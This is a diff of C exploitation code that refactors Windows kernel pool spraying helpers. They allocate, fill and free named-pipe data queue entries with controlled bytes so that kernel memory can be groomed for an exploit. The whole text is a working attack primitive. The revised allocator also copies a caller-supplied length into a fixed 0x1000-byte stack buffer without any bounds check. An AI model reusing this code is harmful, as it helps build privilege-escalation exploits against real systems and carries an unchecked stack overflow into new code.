@@ -81,9 +81,9 @@ int replenishPool()
     return 1;
 }
 
-pipe_pair_t AllocNPPNxChunk(const vs_chunk_t* chunk, size_t block_size)
+pipe_pair_t AllocNpDataQueueEntry(size_t chunk_size, const char* pipe_data, size_t pipe_data_size)
 {
-    // Check if we need to replenish the pool for this block size
+    // Check if we need to replenish the pool for this chunk size
     if (g_pipe_pool.empty())
     {
         replenishPool();
@@ -93,20 +93,20 @@ pipe_pair_t AllocNPPNxChunk(const vs_chunk_t* chunk, size_t block_size)
     pipe_pair_t pipe = g_pipe_pool.back();
     g_pipe_pool.pop_back();
 
-    // Check if block_size is too large
+    // Check if chunk_size is too large
     const size_t temp_buf_size = 0x1000;
-    size_t bufsize = PIPE_QUEUE_ENTRY_BUFSIZE(block_size);
+    size_t bufsize = CALC_NDQE_DataSize(chunk_size);
     if (bufsize > temp_buf_size)
     {
-        fprintf(stderr, "[-] Block size exceeds 0x1000 bytes limit\n");
+        fprintf(stderr, "[-] Chunk size exceeds 0x1000 bytes limit\n");
         return { 0 };
     }
 
     char buffer[temp_buf_size];
     memset(buffer, 0x41, bufsize);
-    if (chunk)
+    if (pipe_data)
     {
-        memcpy(buffer, chunk, MIN(bufsize, sizeof(vs_chunk_t)));
+        memcpy(buffer, pipe_data, pipe_data_size);
     }
 
     WriteDataToPipe(&pipe, buffer, bufsize);
@@ -114,7 +114,7 @@ pipe_pair_t AllocNPPNxChunk(const vs_chunk_t* chunk, size_t block_size)
     return pipe;
 }
 
-pipe_group_t* CreatePipeGroup(size_t nb, size_t block_size)
+pipe_group_t* CreatePipeGroup(size_t nb, size_t chunk_size)
 {
     pipe_group_t* pipe_group = (pipe_group_t*)malloc(sizeof(pipe_group_t) + (nb * sizeof(pipe_pair_t)));
     if (!pipe_group)
@@ -124,31 +124,31 @@ pipe_group_t* CreatePipeGroup(size_t nb, size_t block_size)
     }
 
     pipe_group->nb = nb;
-    pipe_group->block_size = block_size;
+    pipe_group->chunk_size = chunk_size;
     return pipe_group;
 }
 
-pipe_group_t* SprayNPPNxChunks(size_t pipes_size, vs_chunk_t* chunk, size_t block_size)
+pipe_group_t* SprayNpDataQueueEntry(size_t pipes_size, size_t chunk_size, const char* pipe_data, size_t pipe_data_size)
 {
-    pipe_group_t* pool = CreatePipeGroup(pipes_size, block_size);
+    pipe_group_t* pool = CreatePipeGroup(pipes_size, chunk_size);
 
     for (size_t i = 0; i < pipes_size; i++)
     {
-        pool->pipes[i] = AllocNPPNxChunk(chunk, block_size);
+        pool->pipes[i] = AllocNpDataQueueEntry(chunk_size, pipe_data, pipe_data_size);
     }
 
     return pool;
 }
 
-int FreeNPPNxChunk(pipe_pair_t pipe, size_t block_size)
+int FreeNpDataQueueEntry(pipe_pair_t pipe, size_t chunk_size)
 {
-    size_t bufsize = PIPE_QUEUE_ENTRY_BUFSIZE(block_size);
+    size_t dataSize = CALC_NDQE_DataSize(chunk_size);
 
-    if (!pipe.write || !pipe.read || bufsize > 0x1000)
+    if (!pipe.write || !pipe.read || dataSize > 0x1000)
         return 0;
 
     char dummy_out_buf[0x1000];
-    if (!readDataFromPipe(&pipe, dummy_out_buf, bufsize))
+    if (!readDataFromPipe(&pipe, dummy_out_buf, dataSize))
     {
         return 0;
     }
